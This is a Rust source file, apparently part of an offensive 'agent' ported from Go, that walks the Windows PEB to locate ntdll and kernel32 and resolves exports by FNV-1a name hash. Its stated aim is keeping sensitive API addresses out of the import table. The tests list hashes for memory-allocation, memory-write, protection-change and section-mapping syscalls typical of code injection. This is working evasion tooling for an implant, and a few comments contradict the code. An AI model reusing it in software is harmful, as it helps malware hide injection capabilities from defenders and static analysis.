// PE / PEB primitives — mirror of the Go agent's agent/internal/win/nt.go +
// resolve.go. Provides PEB-walk module resolution, export walking and FNV-1a
// hashing so sensitive API addresses never appear in the import table.

#![cfg(target_os = "windows")]

use std::sync::atomic::{AtomicU64, Ordering};

pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE: u32 = 0x10;
pub const PAGE_NOACCESS: u32 = 0x01;
pub const PAGE_READONLY: u32 = 0x02;

#[repr(C)]
pub struct ImageDosHeader {
    pub e_magic: u16,
    pub e_lfanew: i32,
}

#[repr(C)]
pub struct ImageFileHeader {
    pub machine: u16,
    pub number_of_sections: u16,
    pub time_date_stamp: u32,
    pub pointer_to_symbol_table: u32,
    pub number_of_symbols: u32,
    pub size_of_optional_header: u16,
    pub characteristics: u16,
}

#[repr(C)]
pub struct ImageDataDirectory {
    pub virtual_address: u32,
    pub size: u32,
}

#[repr(C)]
pub struct ImageOptionalHeader64 {
    pub magic: u16,
    pub _pad: [u8; 2],
    pub major_linker_version: u8,
    pub minor_linker_version: u8,
    pub size_of_code: u32,
    pub size_of_initialized_data: u32,
    pub size_of_uninitialized_data: u32,
    pub address_of_entry_point: u32,
    pub base_of_code: u32,
    pub image_base: u64,
    pub section_alignment: u32,
    pub file_alignment: u32,
    pub _os: [u16; 4],
    pub win32_version_value: u32,
    pub size_of_image: u32,
    pub size_of_headers: u32,
    pub checksum: u32,
    pub subsystem: u16,
    pub dll_characteristics: u16,
    pub _stack: [u64; 4],
    pub loader_flags: u32,
    pub number_of_rva_and_sizes: u32,
    pub data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
pub struct ImageNtHeaders64 {
    pub signature: u32,
    pub file_header: ImageFileHeader,
    pub optional_header: ImageOptionalHeader64,
}

#[repr(C)]
pub struct ImageExportDirectory {
    pub characteristics: u32,
    pub time_date_stamp: u32,
    pub major_version: u16,
    pub minor_version: u16,
    pub name: u32,
    pub base: u32,
    pub number_of_functions: u32,
    pub number_of_names: u32,
    pub address_of_functions: u32,
    pub address_of_names: u32,
    pub address_of_name_ordinals: u32,
}

#[repr(C)]
pub struct ImageSectionHeader {
    pub name: [u8; 8],
    pub virtual_size: u32,
    pub virtual_address: u32,
    pub size_of_raw_data: u32,
    pub pointer_to_raw_data: u32,
    pub pointer_to_relocations: u32,
    pub pointer_to_linenumbers: u32,
    pub number_of_relocations: u16,
    pub number_of_linenumbers: u16,
    pub characteristics: u32,
}

// FNV-1a hash (export names are ASCII).
pub fn hash_ansi(s: &str) -> u32 {
    let mut h: u32 = 0x811c9dc5;
    for b in s.bytes() {
        h ^= b as u32;
        h = h.wrapping_mul(0x01000193);
    }
    h
}

/// Safe 4-byte read at a pointer (used by PE validation).
unsafe fn read_u16(p: usize) -> u16 {
    *(p as *const u16)
}

/// Parse the NT headers from a module base; returns (nt_headers, size_of_image).
unsafe fn nt_headers(base: usize) -> Option<(*const ImageNtHeaders64, usize)> {
    if base == 0 {
        return None;
    }
    let dos = base as *const ImageDosHeader;
    if read_u16(base) != 0x5A4D {
        return None;
    }
    let lfanew = (*dos).e_lfanew as usize;
    let nt = (base + lfanew) as *const ImageNtHeaders64;
    if (*nt).signature != 0x0000_4550 {
        return None;
    }
    Some((nt, (*nt).optional_header.size_of_image as usize))
}

/// Resolve an export by FNV-1a name hash within a module (bounded reads).
/// Returns the function RVA → absolute address.
pub fn get_export(module_base: usize, name_hash: u32) -> usize {
    unsafe {
        let (nt, mod_end) = match nt_headers(module_base) {
            Some(v) => v,
            None => return 0,
        };
        let edir = &(*nt).optional_header.data_directory[0];
        if edir.virtual_address == 0 {
            return 0;
        }
        let exp = (module_base + edir.virtual_address as usize) as *const ImageExportDirectory;
        let n_names = (*exp).number_of_names as usize;
        let n_funcs = (*exp).number_of_functions as usize;
        if n_names == 0 || n_funcs == 0 {
            return 0;
        }
        let names = (module_base + (*exp).address_of_names as usize) as *const u32;
        let ords = (module_base + (*exp).address_of_name_ordinals as usize) as *const u16;
        let funcs = (module_base + (*exp).address_of_functions as usize) as *const u32;
        for i in 0..n_names {
            let name_rva = *names.add(i);
            let name_ptr = module_base + name_rva as usize;
            if name_ptr >= module_base + mod_end {
                continue;
            }
            if export_name_hash(name_ptr) == name_hash {
                let ord = *ords.add(i) as usize;
                if ord >= n_funcs {
                    continue;
                }
                let fn_rva = *funcs.add(ord);
                let fn_ptr = module_base + fn_rva as usize;
                if fn_ptr >= module_base + mod_end {
                    continue;
                }
                return fn_ptr;
            }
        }
        0
    }
}

/// Hash a NUL-terminated C string in place (export name).
unsafe fn export_name_hash(ptr: usize) -> u32 {
    let mut h: u32 = 0x811c9dc5;
    let mut p = ptr;
    loop {
        let c = *(p as *const u8);
        if c == 0 {
            break;
        }
        h ^= c as u32;
        h = h.wrapping_mul(0x01000193);
        p += 1;
    }
    h
}

/// Read a NUL-terminated ASCII string (bounded by module end).
pub unsafe fn c_string(ptr: usize, limit: usize) -> String {
    if ptr == 0 {
        return String::new();
    }
    let mut out = Vec::new();
    let mut p = ptr;
    while p < limit {
        let c = *(p as *const u8);
        if c == 0 {
            break;
        }
        out.push(c);
        p += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

// ---- PEB walk ----
// PEB->Ldr->InMemoryOrderModuleList. Each node is an LDR_DATA_TABLE_ENTRY whose
// InMemoryOrderLinks field sits at offset 16 (after reserved1[2] + DllBase +
// EntryPoint... actually: reserved[2] 16B, DllBase 8B, EntryPoint 8B, SizeOfImage
// 8B, FullDllName 16B → InMemoryOrderLinks is at offset 0x10). We use the
// hardcoded offsets that Go's windows package guarantees on x64.

// ModuleEntry layout offsets (x64, LDR_DATA_TABLE_ENTRY):
//   0x00 InMemoryOrderLinks.Flink
//   0x08 InMemoryOrderLinks.Blink
//   0x10 reserved2[2]  (16 bytes)
//   0x20 DllBase
//   0x28 EntryPoint
//   0x30 SizeOfImage
//   0x38 FullDllName (UNICODE_STRING: len u16, maxlen u16, pad4, buffer)
// The InMemoryOrderModuleList nodes point at +0x10 from the entry base.
const MOD_LIST_OFFSET: usize = 0x10;
const DLL_BASE_OFFSET: usize = 0x20;
const DLL_NAME_OFFSET: usize = 0x38;

// PEB offset 0x18 → Ldr (in TEB offset 0x60 → PEB). We resolve via NtCurrentTeb.
fn teb() -> usize {
    unsafe {
        let mut teb: usize = 0;
        core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, preserves_flags));
        teb
    }
}

/// PEB base address (TEB+0x60 on x64).
pub fn peb() -> usize {
    unsafe { *((teb() + 0x60) as *const usize) }
}

fn ldr() -> usize {
    unsafe { *((peb() + 0x18) as *const usize) }
}

/// Walk PEB->Ldr->InMemoryOrderModuleList and return the base of the module
/// whose base name equals `base_name` (case-insensitive).
pub fn module_list(base_name: &str) -> usize {
    unsafe {
        let ldr_base = ldr();
        if ldr_base == 0 {
            return 0;
        }
        // InMemoryOrderModuleList is at Ldr+0x20 (list head).
        let list_head = ldr_base + 0x20;
        let mut flink = *(list_head as *const usize);
        let first = list_head;
        while flink != 0 && flink != first {
            let entry = flink - MOD_LIST_OFFSET;
            let name_ptr = entry + DLL_NAME_OFFSET;
            // UNICODE_STRING: len at +0, buffer at +0x8
            let name_len = *(name_ptr as *const u16) as usize / 2;
            let buf = *((name_ptr + 0x8) as *const usize) as *const u16;
            if name_len > 0 && name_len < 64 {
                let name: Vec<u16> = core::slice::from_raw_parts(buf, name_len).to_vec();
                let s = String::from_utf16_lossy(&name);
                if s.eq_ignore_ascii_case(base_name) {
                    return *((entry + DLL_BASE_OFFSET) as *const usize);
                }
            }
            flink = *(flink as *const usize);
        }
        0
    }
}

pub fn module_ntdll() -> usize {
    module_list("ntdll.dll")
}

pub fn module_kernel32() -> usize {
    module_list("kernel32.dll")
}

/// Cached resolved export (avoid re-walking PEB every call).
pub struct ExportCache {
    module: AtomicU64,
    addr: AtomicU64,
}

impl ExportCache {
    pub const fn new() -> Self {
        ExportCache { module: AtomicU64::new(0), addr: AtomicU64::new(0) }
    }

    /// Resolve once and cache by (module_hash, name_hash). Simple: cache first
    /// resolution; the module base is stable for the process lifetime.
    pub fn resolve(&self, module: usize, name_hash: u32) -> usize {
        let cached = self.addr.load(Ordering::SeqCst);
        if cached != 0 && self.module.load(Ordering::SeqCst) == module as u64 {
            return cached as usize;
        }
        let addr = get_export(module, name_hash);
        if addr != 0 {
            self.module.store(module as u64, Ordering::SeqCst);
            self.addr.store(addr as u64, Ordering::SeqCst);
        }
        addr
    }

    pub fn resolve_by_name(&self, module: usize, name: &str) -> usize {
        self.resolve(module, hash_ansi(name))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fnv1a_hashes_match_go() {
        // Verified against the Go agent's hashAnsi() values.
        assert_eq!(hash_ansi("NtAllocateVirtualMemory"), 0xca67b978);
        assert_eq!(hash_ansi("NtProtectVirtualMemory"), 0xbd799926);
        assert_eq!(hash_ansi("NtWriteVirtualMemory"), 0x43e32f32);
        assert_eq!(hash_ansi("NtDelayExecution"), 0xd856e554);
        assert_eq!(hash_ansi("NtCreateSection"), 0x3c59f362);
        assert_eq!(hash_ansi("NtMapViewOfSection"), 0xcbc9e1ae);
        assert_eq!(hash_ansi("NtUnmapViewOfSection"), 0x53b808c5);
        assert_eq!(hash_ansi("NtOpenSection"), 0x14858576);
        assert_eq!(hash_ansi("NtOpenFile"), 0x7042a37d);
        assert_eq!(hash_ansi("NtClose"), 0x6b372c05);
        assert_eq!(hash_ansi("NtWaitForSingleObject"), 0xb073c52e);
    }
}
